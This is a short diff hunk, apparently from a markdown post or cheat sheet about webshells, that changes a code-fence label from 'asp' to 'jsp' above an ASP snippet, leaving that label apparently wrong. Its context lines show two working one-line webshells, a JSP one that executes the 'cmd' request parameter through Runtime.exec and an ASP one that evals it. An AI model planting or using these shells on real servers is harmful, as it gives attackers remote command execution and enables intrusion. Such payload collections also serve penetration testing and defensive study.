@@ -18,6 +18,6 @@ show_image_post: false                                    # Change this to true
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 ### ASP WEBSHELL
-```asp
+```jsp
 <% eval request("cmd") %>
 ```
